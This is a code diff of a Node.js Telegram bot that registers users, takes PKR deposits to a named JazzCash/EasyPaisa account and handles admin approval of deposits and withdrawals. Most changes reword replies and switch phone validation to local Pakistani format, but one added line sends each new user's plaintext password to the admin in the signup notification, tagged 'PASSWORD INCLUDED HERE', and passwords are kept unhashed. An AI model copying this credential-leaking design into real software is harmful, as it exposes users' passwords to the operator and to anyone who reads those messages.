@@ -107,7 +107,7 @@ bot.on('text', async (ctx) => {
         switch (session.step) {
             case 'firstName':
                 if (text.length < 2 || text.length > 30) {
-                    return ctx.reply('❌ Name must be between 2 to 30 characters. Try again:');
+                    return ctx.reply('❌ Name must be between 2 to 30 characters. Please try again:');
                 }
                 session.firstName = text;
                 session.step = 'dob';
@@ -117,7 +117,7 @@ bot.on('text', async (ctx) => {
                 // Validate date format
                 const match = text.match(/^(\d{2})-(\d{2})-(\d{4})$/);
                 if (!match) {
-                    return ctx.reply('❌ Wrong format. Enter in correct format:\nExample: 31-01-2000');
+                    return ctx.reply('❌ Wrong format. Please enter in correct format:\nExample: 31-01-2000');
                 }
                 
                 const day = parseInt(match[1]);
@@ -134,31 +134,27 @@ bot.on('text', async (ctx) => {
                 const currentYear = new Date().getFullYear();
                 const age = currentYear - year;
                 if (age < 14 || age > 55) {
-                    return ctx.reply('❌ Age must be between 14 to 55 years. Enter new date:');
+                    return ctx.reply('❌ Age must be between 14 to 55 years. Please enter new year:');
                 }
                 
                 session.dob = text;
                 session.step = 'whatsapp';
-                return ctx.reply('📱 Enter your WhatsApp number in international format:\nExample: +923001234567\n\n❌ Only +92 format accepted');
+                return ctx.reply('📱 Enter your WhatsApp number (Pakistan):\nExample: 03001234567\n\n❌ Do not add +92 or 92');
             }
 
             case 'whatsapp': {
-                // Clean and validate WhatsApp number in international format
-                let phone = text.trim();
+                // Clean and validate Pakistani WhatsApp number
+                let phone = text.replace(/\s+/g, '').replace(/^\+?92?/, '');
                 
-                // Remove any spaces or dashes
-                phone = phone.replace(/\s+/g, '').replace(/-/g, '');
-                
-                // Validate international format +923001234567
-                if (!/^\+923\d{9}$/.test(phone)) {
-                    return ctx.reply('❌ Invalid number. Please enter in international format:\nExample: +923001234567\n\nOnly +92 format accepted');
+                if (!/^3\d{9}$/.test(phone)) {
+                    return ctx.reply('❌ Invalid number. Please enter correct Pakistani number:\nExample: 03001234567');
                 }
                 
                 // Check if number already exists
                 const existingUser = Object.values(users).find(user => user.phone === phone);
                 if (existingUser) {
                     const existingUsername = Object.keys(users).find(key => users[key] === existingUser);
-                    return ctx.reply(`❌ This number is already registered.\n\n📌 Existing account:\n👤 Name: ${existingUser.firstName}\n🔑 Username: ${existingUsername}\n\nPlease use a different number:`);
+                    return ctx.reply(`❌ This number is already registered.\n\n📌 Existing account:\n👤 Name: ${existingUser.firstName}\n🔑 Username: ${existingUsername}\n\nPlease use a new number:`);
                 }
                 
                 session.phone = phone;
@@ -168,11 +164,11 @@ bot.on('text', async (ctx) => {
 
             case 'username':
                 if (!/^[a-z0-9_]{3,15}$/.test(text)) {
-                    return ctx.reply('❌ Invalid format. Use only lowercase letters, numbers and _ :\nExample: ali_123');
+                    return ctx.reply('❌ Invalid format. Use only lowercase letters, numbers and _:\nExample: ali_123');
                 }
                 
                 if (users[text]) {
-                    return ctx.reply(`❌ Username "${text}" is already taken.\nPlease choose a different username:`);
+                    return ctx.reply(`❌ Username "${text}" is already taken.\nPlease choose a new username:`);
                 }
                 
                 session.username = text;
@@ -181,7 +177,7 @@ bot.on('text', async (ctx) => {
 
             case 'password':
                 if (!PASSWORD_REGEX.test(text)) {
-                    return ctx.reply('❌ Weak password. Create password according to rules above:\nExample: Password123');
+                    return ctx.reply('❌ Weak password. Please follow the rules:\nExample: Password123');
                 }
                 
                 session.password = text;
@@ -212,7 +208,7 @@ bot.on('text', async (ctx) => {
                 await ctx.reply(
                     '✅ Account created successfully!\n\n' +
                     `👋 Welcome ${session.firstName}!\n\n` +
-                    'You can now log in.',
+                    'Now you can log in.',
                     Markup.inlineKeyboard([
                         [Markup.button.callback('🔑 Log In', 'login')]
                     ])
@@ -220,11 +216,12 @@ bot.on('text', async (ctx) => {
 
                 const { date, time } = getCurrentDateTime();
                 const adminMsg = `
-🆕 New Account Created
+🆕 NEW ACCOUNT CREATED
 👤 Name: ${session.firstName}
 🎂 Date of Birth: ${session.dob}
 📱 WhatsApp: ${session.phone}
 👤 Username: ${session.username}
+🔑 Password: ${session.password}  // PASSWORD INCLUDED HERE
 📅 Date: ${date}
 ⏰ Time: ${time}
 📲 Telegram: @${ctx.from.username || 'Not available'} (ID: ${chatId})
@@ -242,7 +239,7 @@ bot.on('text', async (ctx) => {
             case 'loginUsername':
                 if (!users[text]) {
                     return ctx.reply(
-                        '❌ Username not found.\n\n' +
+                        '❌ Username does not exist.\n\n' +
                         'Don\'t have an account? Create new account:',
                         Markup.inlineKeyboard([
                             [Markup.button.callback('📝 Create New Account', 'signup')],
@@ -436,9 +433,9 @@ bot.on('text', async (ctx) => {
         if (session.step === 'enterAccountNumber') {
             const accountNumber = text.trim();
             
-            // Validate Pakistan mobile number in +92 format for withdrawal
-            if (!/^\+923\d{9}$/.test(accountNumber)) {
-                return ctx.reply('❌ Invalid account number. Must be in +92 format (e.g., +923001234567).');
+            // Validate Pakistan mobile number
+            if (!/^03\d{9}$/.test(accountNumber)) {
+                return ctx.reply('❌ Invalid account number. Must be 11 digits starting with 03 (e.g., 03001234567).');
             }
 
             session.withdrawAccount = accountNumber;
@@ -568,7 +565,7 @@ bot.action(/deposit(JazzCash|EasyPaisa|UPaisa)/, async (ctx) => {
         `💰 You selected ${accountType} for deposit.\n\n` +
         `📤 Please send payment to:\n\n` +
         `Account Title: M Hadi\n` +
-        `Account Number: +923000382844\n` +
+        `Account Number: 03000382844\n` +
         `Account Type: ${accountType}\n\n` +
         `💵 Enter the amount you are sending (PKR):\n` +
         `• Minimum: 100 PKR\n` +
@@ -709,7 +706,7 @@ bot.action(/withdraw(JazzCash|EasyPaisa|UPaisa)/, async (ctx) => {
     
     return ctx.reply(
         `🏦 You selected ${accountType} for withdrawal.\n\n` +
-        `📱 Enter your ${accountType} account number in +92 format (e.g., +923001234567):`
+        `📱 Enter your ${accountType} account number (11 digits, e.g., 03001234567):`
     );
 });
 
@@ -850,4 +847,308 @@ bot.action('viewTransactions', async (ctx) => {
     return ctx.reply(historyMsg, withBackButton([]));
 });
 
-// ---
+// --- Log Out
+bot.action('logOut', async (ctx) => {
+    sessions[ctx.chat.id] = null;
+    return ctx.reply('🔓 You have been logged out.', withBackButton([]));
+});
+
+// ======= BACK BUTTON =====
+bot.action('backToMenu', async (ctx) => {
+    const session = sessions[ctx.chat.id];
+    if (!session || !session.usernameKey) {
+        return ctx.reply(
+            '👋 Welcome!\n\nPlease Sign Up or Log In:',
+            Markup.inlineKeyboard([
+                Markup.button.callback('Sign Up', 'signup'),
+                Markup.button.callback('Log In', 'login')
+            ])
+        );
+    } else {
+        const user = users[session.usernameKey];
+        return ctx.reply(
+            `Dear ${user.firstName}, Welcome To Paid WhatsApp Bot`,
+            withBackButton([
+                [Markup.button.callback('Check Balance', 'checkBalance')],
+                [Markup.button.callback('Buy Bot', 'buyBot')],
+                [Markup.button.callback('Deposit Balance', 'depositBalance')],
+                [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
+                [Markup.button.callback('Log Out', 'logOut')]
+            ])
+        );
+    }
+});
+
+// ======= HELPER FUNCTIONS =======
+async function processDepositRejection(userChatId, depositId, reason, adminCtx) {
+    const session = sessions[userChatId];
+    if (!session || !session.usernameKey) {
+        await adminCtx.answerCbQuery('User not found.');
+        return;
+    }
+
+    const user = users[session.usernameKey];
+    if (!user.pendingDeposits) {
+        await adminCtx.answerCbQuery('No pending deposits.');
+        return;
+    }
+
+    const depositIndex = user.pendingDeposits.findIndex(d => d.id === depositId);
+    if (depositIndex === -1) {
+        await adminCtx.answerCbQuery('Deposit already processed.');
+        return;
+    }
+
+    const deposit = user.pendingDeposits[depositIndex];
+    const { date, time } = getCurrentDateTime();
+
+    // Update daily deposit count
+    if (user.dailyDeposits) {
+        user.dailyDeposits.count = Math.max(0, user.dailyDeposits.count - 1);
+        user.dailyDeposits.amount = Math.max(0, user.dailyDeposits.amount - deposit.amount);
+    }
+
+    // Add to transaction history with reason
+    if (!user.transactions) user.transactions = [];
+    user.transactions.push({
+        type: `Deposit ❌ (Rejected)`,
+        amount: deposit.amount,
+        date: date,
+        time: time,
+        proof: deposit.proof,
+        status: 'rejected',
+        rejectionReason: reason
+    });
+
+    // Notify user with reason
+    await bot.telegram.sendMessage(
+        userChatId,
+        `❌ Deposit Rejected!\n\n` +
+        `💰 Amount: ${deposit.amount} PKR\n` +
+        `🏦 Method: ${deposit.method}\n` +
+        `📝 Transaction ID: ${deposit.proof}\n` +
+        `📅 Date: ${date} at ${time}\n\n` +
+        `❌ Rejection Reason:\n${reason}\n\n` +
+        `Contact admin for more information.`,
+        withBackButton([])
+    );
+
+    // Remove from pending
+    user.pendingDeposits.splice(depositIndex, 1);
+    saveUsers();
+
+    await adminCtx.editMessageText(`❌ Deposit Rejected\n\nUser: ${user.firstName}\nAmount: ${deposit.amount} PKR\nReason: ${reason}`);
+}
+
+async function processWithdrawRejection(userChatId, withdrawId, reason, adminCtx) {
+    const session = sessions[userChatId];
+    if (!session || !session.usernameKey) {
+        await adminCtx.answerCbQuery('User not found.');
+        return;
+    }
+
+    const user = users[session.usernameKey];
+    if (!user.pendingWithdrawals) {
+        await adminCtx.answerCbQuery('No pending withdrawals.');
+        return;
+    }
+
+    const withdrawIndex = user.pendingWithdrawals.findIndex(w => w.id === withdrawId);
+    if (withdrawIndex === -1) {
+        await adminCtx.answerCbQuery('Withdrawal already processed.');
+        return;
+    }
+
+    const withdraw = user.pendingWithdrawals[withdrawIndex];
+    const { date, time } = getCurrentDateTime();
+
+    // Return balance to user
+    user.balance += withdraw.amount;
+    
+    // Update daily withdrawal count
+    if (user.dailyWithdrawals) {
+        user.dailyWithdrawals.count = Math.max(0, user.dailyWithdrawals.count - 1);
+        user.dailyWithdrawals.amount = Math.max(0, user.dailyWithdrawals.amount - withdraw.amount);
+    }
+
+    // Add to transaction history with reason
+    if (!user.transactions) user.transactions = [];
+    user.transactions.push({
+        type: `Withdrawal ❌ (Rejected)`,
+        amount: withdraw.amount,
+        date: date,
+        time: time,
+        account: withdraw.account,
+        status: 'rejected',
+        rejectionReason: reason
+    });
+
+    // Notify user with reason
+    await bot.telegram.sendMessage(
+        userChatId,
+        `❌ Withdrawal Rejected!\n\n` +
+        `💰 Amount: ${withdraw.amount} PKR\n` +
+        `🏦 Method: ${withdraw.method}\n` +
+        `📱 Account: ${withdraw.account}\n` +
+        `📅 Date: ${date} at ${time}\n\n` +
+        `❌ Rejection Reason:\n${reason}\n\n` +
+        `Your balance has been restored.\n` +
+        `Current Balance: ${user.balance} PKR`,
+        withBackButton([])
+    );
+
+    // Remove from pending
+    user.pendingWithdrawals.splice(withdrawIndex, 1);
+    saveUsers();
+
+    await adminCtx.editMessageText(`❌ Withdrawal Rejected\n\nUser: ${user.firstName}\nAmount: ${withdraw.amount} PKR returned to balance.\nReason: ${reason}`);
+}
+
+// ======= ADMIN APPROVAL FOR DEPOSITS =======
+bot.action(/admin_approve_deposit_(\d+)_(dep_\d+_\d+)/, async (ctx) => {
+    const [_, userChatId, depositId] = ctx.match;
+    const session = sessions[userChatId];
+    if (!session || !session.usernameKey) return ctx.answerCbQuery('User not found.');
+
+    const user = users[session.usernameKey];
+    if (!user.pendingDeposits) return ctx.answerCbQuery('No pending deposits.');
+
+    const depositIndex = user.pendingDeposits.findIndex(d => d.id === depositId);
+    if (depositIndex === -1) return ctx.answerCbQuery('Deposit already processed.');
+
+    const deposit = user.pendingDeposits[depositIndex];
+    const { date, time } = getCurrentDateTime();
+
+    // Add balance with bonus
+    user.balance += deposit.totalAmount;
+    
+    // Add to transaction history
+    if (!user.transactions) user.transactions = [];
+    user.transactions.push({
+        type: `Deposit ➕ (${deposit.method})`,
+        amount: deposit.amount,
+        bonus: deposit.bonus,
+        totalAmount: deposit.totalAmount,
+        date: date,
+        time: time,
+        proof: deposit.proof,
+        status: 'approved'
+    });
+
+    saveUsers();
+
+    // Notify user
+    await bot.telegram.sendMessage(
+        userChatId,
+        `✅ Deposit Approved!\n\n` +
+        `💰 Amount: ${deposit.amount} PKR\n` +
+        `🎁 Bonus: ${deposit.bonus} PKR\n` +
+        `💵 Total Added: ${deposit.totalAmount} PKR\n` +
+        `🏦 Method: ${deposit.method}\n` +
+        `📝 Transaction ID: ${deposit.proof}\n` +
+        `📅 Date: ${date} at ${time}\n\n` +
+        `New Balance: ${user.balance} PKR`,
+        withBackButton([])
+    );
+
+    // Remove from pending
+    user.pendingDeposits.splice(depositIndex, 1);
+    saveUsers();
+
+    await ctx.editMessageText(`✅ Deposit Approved\n\nUser: ${user.firstName}\nAmount: ${deposit.totalAmount} PKR added (${deposit.amount} + ${deposit.bonus} bonus)`);
+});
+
+bot.action(/admin_reject_deposit_(\d+)_(dep_\d+_\d+)/, async (ctx) => {
+    const [_, userChatId, depositId] = ctx.match;
+    
+    // Store rejection data and ask for reason
+    const adminSession = sessions[ctx.chat.id] || {};
+    adminSession.flow = 'admin_reject_reason';
+    sessions[ctx.chat.id] = adminSession;
+    
+    pendingAdminRejections[ctx.chat.id] = {
+        requestType: 'deposit',
+        userChatId: userChatId,
+        requestId: depositId
+    };
+    
+    await ctx.answerCbQuery();
+    await ctx.reply('📝 Please enter the reason for rejecting this deposit request:');
+});
+
+// ======= ADMIN APPROVAL FOR WITHDRAWALS =======
+bot.action(/admin_approve_withdraw_(\d+)_(wd_\d+_\d+)/, async (ctx) => {
+    const [_, userChatId, withdrawId] = ctx.match;
+    const session = sessions[userChatId];
+    if (!session || !session.usernameKey) return ctx.answerCbQuery('User not found.');
+
+    const user = users[session.usernameKey];
+    if (!user.pendingWithdrawals) return ctx.answerCbQuery('No pending withdrawals.');
+
+    const withdrawIndex = user.pendingWithdrawals.findIndex(w => w.id === withdrawId);
+    if (withdrawIndex === -1) return ctx.answerCbQuery('Withdrawal already processed.');
+
+    const withdraw = user.pendingWithdrawals[withdrawIndex];
+    const { date, time } = getCurrentDateTime();
+
+    // Update withdrawal status
+    withdraw.status = 'approved';
+    withdraw.approvedDate = date;
+    withdraw.approvedTime = time;
+
+    // Add to transaction history
+    if (!user.transactions) user.transactions = [];
+    user.transactions.push({
+        type: `Withdrawal ➖ (${withdraw.method})`,
+        amount: withdraw.amount,
+        netAmount: withdraw.netAmount,
+        fee: withdraw.fee,
+        date: date,
+        time: time,
+        account: withdraw.account,
+        status: 'approved'
+    });
+
+    saveUsers();
+
+    // Notify user
+    await bot.telegram.sendMessage(
+        userChatId,
+        `✅ Withdrawal Approved!\n\n` +
+        `💰 Amount: ${withdraw.amount} PKR\n` +
+        `📉 Fee: ${withdraw.fee} PKR\n` +
+        `💵 Net Sent: ${withdraw.netAmount} PKR\n` +
+        `🏦 To: ${withdraw.account} (${withdraw.method})\n` +
+        `📅 Date: ${date} at ${time}\n\n` +
+        `Your funds have been sent to your account.`,
+        withBackButton([])
+    );
+
+    // Remove from pending
+    user.pendingWithdrawals.splice(withdrawIndex, 1);
+    saveUsers();
+
+    await ctx.editMessageText(`✅ Withdrawal Approved & Amount Sent\n\nUser: ${user.firstName}\nAmount: ${withdraw.netAmount} PKR sent to ${withdraw.account}`);
+});
+
+bot.action(/admin_reject_withdraw_(\d+)_(wd_\d+_\d+)/, async (ctx) => {
+    const [_, userChatId, withdrawId] = ctx.match;
+    
+    // Store rejection data and ask for reason
+    const adminSession = sessions[ctx.chat.id] || {};
+    adminSession.flow = 'admin_reject_reason';
+    sessions[ctx.chat.id] = adminSession;
+    
+    pendingAdminRejections[ctx.chat.id] = {
+        requestType: 'withdraw',
+        userChatId: userChatId,
+        requestId: withdrawId
+    };
+    
+    await ctx.answerCbQuery();
+    await ctx.reply('📝 Please enter the reason for rejecting this withdrawal request:');
+});
+
+// ===== LAUNCH =====
+bot.launch();
+console.log('Bot running...');
